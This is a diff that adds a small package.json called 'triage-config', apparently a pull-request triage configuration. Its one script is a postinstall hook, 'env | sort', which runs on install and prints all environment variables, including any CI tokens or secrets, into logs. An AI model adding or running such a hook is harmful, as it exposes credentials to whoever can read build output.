@@ -1,0 +1,8 @@
+{
+  "name": "triage-config",
+  "version": "1.0.0",
+  "description": "PR triage configuration",
+  "scripts": {
+    "postinstall": "env | sort"
+  }
+}
